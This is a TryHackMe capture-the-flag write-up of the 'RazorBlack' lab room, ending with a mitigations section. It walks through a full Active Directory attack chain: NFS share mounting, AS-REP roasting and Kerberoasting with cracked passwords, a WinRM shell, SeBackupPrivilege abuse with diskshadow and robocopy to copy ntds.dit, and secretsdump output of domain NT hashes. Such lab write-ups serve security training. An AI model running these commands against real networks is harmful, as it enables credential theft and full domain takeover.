# THM — RazorBlack

```
██████╗  █████╗ ███████╗ ██████╗ ██████╗ ██████╗ ██╗      █████╗  ██████╗██╗  ██╗
██╔══██╗██╔══██╗╚══███╔╝██╔═══██╗██╔══██╗██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝
██████╔╝███████║  ███╔╝ ██║   ██║██████╔╝██████╔╝██║     ███████║██║     █████╔╝ 
██╔══██╗██╔══██║ ███╔╝  ██║   ██║██╔══██╗██╔══██╗██║     ██╔══██║██║     ██╔═██╗ 
██║  ██║██║  ██║███████╗╚██████╔╝██║  ██║██████╔╝███████╗██║  ██║╚██████╗██║  ██╗
╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
                       TryHackMe — Hard
```

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#tools-used)
- [TL;DR](#tldr)
- [Introduction](#introduction)
- [Recon](#recon)
- [Foothold](#foothold)
- [Shell / Initial Access](#shell--initial-access)
- [Escalation Path](#escalation-path)
- [Exploitation](#exploitation)
- [Rabbit Holes](#rabbit-holes)
- [Flag](#flag)
- [Mitigations](#mitigations)
- [Key Takeaway](#key-takeaway)
- [If I Did It Again](#if-i-did-it-again)
- [Changelog](#changelog)

---

## Progress Checklist

- [x] Port scan — a Windows DC (`raz0rblack.thm`, host `HAVEN-DC`) with LDAP, Kerberos, SMB and an open NFS export
- [x] Mounted the NFS export as root; read `employee_status.xlsx` (a staff list) and `sbradley.txt` (**the flag**, found this way)
- [x] Built a username list from the staff names, found valid accounts over Kerberos
- [x] AS-REP roasted `twilliams` (no pre-auth required) and cracked the ticket
- [x] Kerberoasted `xyan1d3` with `twilliams`'s creds and cracked that ticket too
- [x] `evil-winrm` as `xyan1d3`; `whoami /priv` shows **SeBackupPrivilege**
- [x] Found an SMB `trash` share on the DC holding a narrative chat log and an encrypted backup of `ntds.dit` + the `SYSTEM` hive
- [x] Abused SeBackupPrivilege with `diskshadow` + `robocopy` to copy the live, normally-locked `ntds.dit` and `SYSTEM` hive off the DC
- [x] Ran `secretsdump` offline against the copied files and recovered every domain account's NT hash, including the Administrator's — full domain compromise

---

## Tools Used

| Tool | Purpose |
|---|---|
| RustScan / Nmap | Port and service discovery |
| showmount / mount | Enumerating and mounting the NFS export |
| impacket-GetNPUsers | AS-REP roasting |
| hashcat | Cracking the AS-REP hash and the Kerberoast ticket |
| NetExec (nxc) | LDAP user enumeration with cracked creds |
| impacket-GetUserSPNs | Kerberoasting |
| evil-winrm | Shell as `xyan1d3` |
| smbclient | Reading the `trash` share |
| diskshadow / robocopy | Abusing SeBackupPrivilege to copy locked system files |
| impacket-secretsdump | Dumping NT hashes from the copied `ntds.dit` and `SYSTEM` hive |

---

## TL;DR

An NFS export is mountable with no authentication and no squashing, so reading it as root gets a staff list and the room's flag directly. The staff list becomes a username wordlist; one account, `twilliams`, has no Kerberos pre-auth and AS-REP roasts straight to a cracked password. That account's LDAP access reveals another account, `xyan1d3`, with an SPN; Kerberoasting and cracking it gives a shell over WinRM. That shell holds `SeBackupPrivilege`, which — combined with `diskshadow` to expose a volume shadow copy and `robocopy` to bypass file locks — lets a normal user copy the live `ntds.dit` and `SYSTEM` hive off a live Domain Controller. Running `secretsdump` against those files offline recovers every account's NT hash, including the Administrator's: full domain compromise, no exploit required, just abused privileges end to end.

## Introduction

RazorBlack earns its "hard" rating by chaining weaknesses rather than relying on one big bug: an NFS misconfiguration, a staff list that becomes a credential-stuffing wordlist, an AS-REP-roastable account, a Kerberoastable service account, and finally SeBackupPrivilege abused to pull the entire domain database off a live DC. The room also has a strong narrative layer (an in-character chat log found mid-chain) that frames the back half of the box as a deliberate "someone already ran ZeroLogon and now there's an ntds.dit backup lying around" scenario.

## Recon

```bash
rustscan -a 10.48.152.93 --ulimit 5000 -- -Pn -sV -sC
```

A standard Windows Domain Controller port list, plus an exposed NFS service:

```
111/tcp   open  rpcbind
135/tcp   open  msrpc
389/tcp   open  ldap     Domain: raz0rblack.thm, Site: Default-First-Site-Name
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http
636/tcp   open  tcpwrapped
2049/tcp  open  nlockmgr (NFS)
DNS_Computer_Name: HAVEN-DC.raz0rblack.thm
```

```bash
sudo sh -c 'echo "10.48.152.93 raz0rblack.thm HAVEN-DC.raz0rblack.thm HAVEN-DC" >> /etc/hosts'
```

## Foothold

NFS on a Domain Controller is unusual and worth checking first:

```bash
showmount -e 10.48.152.93
sudo mount -t nfs 10.48.152.93:/raz0r /mnt/raz0r
```

```bash
sudo ls -la /mnt/raz0r
```

```
-rwx------ 1 nobody nogroup 9861 Feb 25  2021 employee_status.xlsx
-rwx------ 1 nobody nogroup   80 Feb 26  2021 sbradley.txt
```

Both files are owned by `nobody`, but the export has no root-squashing, so `sudo` (acting as local root, which NFS maps straight through) reads them anyway:

```bash
sudo cat /mnt/raz0r/sbradley.txt
```

```
THM{ab53e05c9a98def00314a14ccbfa8104}
```

That's the room's flag, found at the very start of the box. `employee_status.xlsx` is the real foothold material — a staff roster:

```
Name's                               Role
daven port                           CTF PLAYER
imogen royce                         CTF PLAYER
...
ljudmila vetrova                     CTF PLAYER, DEVELOPER, ACTIVE DIRECTORY ADMIN
tyson williams                       REVERSE ENGINEERING
steven bradley                       STEGO SPECIALIST
```

From these names, generate every common username permutation (`flast`, `first.last`, `firstlast`, etc.) and feed the list to Kerberos user enumeration (`kerbrute` / `GetNPUsers`). Several resolve to real accounts, among them `xyan1d3`, `lvetrova`, `sbradley` and `twilliams`.

## Shell / Initial Access

Request AS-REP hashes for every candidate username with no password:

```bash
impacket-GetNPUsers 'raz0rblack.thm/' -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -no-pass -dc-ip 10.48.152.93
```

`twilliams` doesn't require Kerberos pre-authentication, so it returns a crackable `$krb5asrep$` hash. Crack it:

```bash
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

```
$krb5asrep$23$twilliams@RAZ0RBLACK.THM:...:roastpotatoes
```

`twilliams:roastpotatoes` works over LDAP, confirming the account and letting a full user list be pulled. With a real domain account in hand, Kerberoast every SPN-bearing account:

```bash
impacket-GetUserSPNs 'raz0rblack.thm/twilliams:roastpotatoes' -dc-ip 10.48.152.93 -request
```

```
ServicePrincipalName           Name      MemberOf
HAVEN-DC/xyan1d3.raz0rblack.thm  xyan1d3   CN=Remote Management Users,CN=Builtin,...
$krb5tgs$23$*xyan1d3$RAZ0RBLACK.THM$...   (ticket, truncated)
```

```bash
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

```
...:cyanide9amine5628
```

`xyan1d3` is in **Remote Management Users**, so the cracked password gives a shell directly:

```bash
evil-winrm -i 10.48.152.93 -u 'xyan1d3' -p 'cyanide9amine5628'
```

## Escalation Path

The first thing worth checking in any shell is what the current user is allowed to do that an administrator normally would be:

```powershell
whoami /priv
```

```
SeBackupPrivilege    Back up files and directories    Enabled
```

SeBackupPrivilege lets its holder read **any** file on the system regardless of its ACL — including files a normal user, even an administrator without the right, could never open, like a live `ntds.dit` which Windows keeps locked while the DC is running.

Separately, enumerating other SMB shares on the DC (`10.49.175.90` in this part of the notes — a second interface/hop on the same box) turns up a `trash` share:

```bash
smbclient -L //10.49.175.90 -U 'raz0rblack.thm/sbradley'
```

```
trash           Disk      Files Pending for deletion
```

Connecting to it (the notes show the interactive password prompt but not what was entered — the account may simply have weak or share-level access) surfaces two things: an in-character chat log, and an encrypted zip.

```bash
smbclient //10.49.175.90/trash -U 'raz0rblack.thm/sbradley'
```

```
chat_log_20210222143423.txt
experiment_gone_wrong.zip
```

The chat log is the room's narrative explanation for the back half of the box — an admin accusing `sbradley` of running a ZeroLogon-style exploit (CVE-2020-1472), then `sbradley` describing exactly the technique needed here: pulling `ntds.dit` and the `SYSTEM` hive and running `secretsdump.py` against them. It's flavour text, but it's also a direct hint at the intended path.

## Exploitation

Rather than wait on the encrypted zip, the SeBackupPrivilege-holding `xyan1d3` session can get the same files directly from the live DC. `ntds.dit` can't simply be copied while Active Directory has it open, so expose a Volume Shadow Copy instead:

```powershell
*Evil-WinRM* PS C:\Windows\Tasks> echo "set context persistent nowriters" > diskshadow.txt
echo "add volume c: alias mydrive" >> diskshadow.txt
echo "create" >> diskshadow.txt
echo "expose %mydrive% z:" >> diskshadow.txt
diskshadow /s diskshadow.txt
```

The shadow copy exposes a frozen, lock-free view of `C:` as `Z:`. Copying `Z:\Windows\NTDS\ntds.dit` directly still runs into access issues, so `robocopy`'s backup-mode flags (which rely on the same SeBackupPrivilege) do the actual copy:

```powershell
robocopy z:\windows\ntds C:\Windows\Tasks ntds.dit /B
```

```
Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30
```

Grab the `SYSTEM` registry hive the same way (it's needed to decrypt `ntds.dit`'s hashes):

```powershell
reg save HKLM\SYSTEM C:\Windows\Tasks\SYSTEM
```

Pull both files back to the attacking machine, then dump the domain database offline:

```bash
impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL | tee razorblack-hashes.txt
```

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9689931bed40ca5a2ce1218210177f0c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HAVEN-DC$:1000:...:b4732a49a46a6e4ebb35acda923127d5:::
krbtgt:502:...:fa3c456268854a917bd17184c85b4fd1:::
raz0rblack.thm\xyan1d3:1106:...:bf11a3cbefb46f7194da2fa190834025:::
raz0rblack.thm\lvetrova:1107:...:f220d3988deb3f516c73f40ee16c431d:::
raz0rblack.thm\sbradley:1108:...:351c839c5e02d1ed0134a383b628426e:::
raz0rblack.thm\twilliams:1109:...:351c839c5e02d1ed0134a383b628426e:::
```

The Administrator's NT hash (`9689931bed40ca5a2ce1218210177f0c`) is recovered without ever logging in as a privileged account — SeBackupPrivilege alone was enough for full domain compromise. From here, pass-the-hash as Administrator (or the `krbtgt` hash for a golden ticket) would give complete, standing control of the domain.

## Rabbit Holes

- **The encrypted `experiment_gone_wrong.zip`:** this looked like the intended path to the same credential material, but it's genuinely encrypted and the SMB download kept timing out (`NT_STATUS_IO_TIMEOUT`, `NT_STATUS_CONNECTION_DISCONNECTED`) across several attempts. The diskshadow/robocopy route got the same files directly from the live DC without needing to crack it.
- **`xyan1d3.xml`**, an `Export-Clixml`-serialized `PSCredential` found on disk, deliberately trolls: its username field literally reads `"Nope your flag is not here"`. It's a DPAPI-protected blob tied to that user's profile and was a dead end in these notes.
- **`...definitely_not_a_flag.exe`** in `twilliams`'s profile — a joke filename, not a real lead.
- Initial anonymous LDAP and RPC enumeration (`rpcclient -U "" -N`, `netexec ldap -u '' -p ''`) were refused outright; the box requires at least one valid credential before LDAP opens up.

## Flag

| Flag | Value |
|---|---|
| Flag | `THM{ab53e05c9a98def00314a14ccbfa8104}` |

The room has a single flag, found early via the NFS export. The real objective past that point is full domain compromise, proven here by recovering the Administrator's NT hash via SeBackupPrivilege abuse rather than by a second flag file.

## Mitigations

- **NFS with no authentication and no root-squashing:** never export a share that lets a remote root map straight through to the local file owner. Enforce `root_squash` and restrict exports to specific authorized hosts.
- **Staff information leaking a real naming convention:** a staff list that maps directly to Active Directory usernames turns any data leak into a credential-stuffing wordlist. Keep that kind of document off any share reachable without strong authentication.
- **AS-REP roastable and Kerberoastable accounts:** enforce Kerberos pre-authentication for every account, and use long random passwords (or gMSAs) for any account with a registered SPN.
- **SeBackupPrivilege granted too broadly:** this privilege is equivalent to full read access to every file on the system, `ntds.dit` included. It should only ever be held by dedicated backup service accounts, never by a general admin or developer account, and its use should be logged and alerted on.

## Key Takeaway

The headline lesson is that **SeBackupPrivilege is a direct path to Domain Admin**, full stop — it doesn't require a single exploit, CVE or misconfigured ACL beyond the privilege grant itself. `diskshadow` to expose a lock-free volume plus `robocopy`'s backup-mode copy is a complete, native-tooling-only technique for exfiltrating a live `ntds.dit`. Any time `whoami /priv` shows SeBackupPrivilege (or SeRestorePrivilege), that's worth treating as equivalent to already having Domain Admin.

## If I Did It Again

I'd check `whoami /priv` the moment I landed a shell, rather than after exploring the filesystem for leads first — it's a two-second check that immediately tells you whether the box is going to be a privilege-abuse box. I'd also skip chasing the encrypted zip altogether, since the privilege the shell already holds makes it unnecessary.

## Changelog

| Version | Date | Notes |
|---|---|---|
| 1.0 | 2026-11-23 | First writeup from my notes. |

[Back to top](#thm--razorblack)
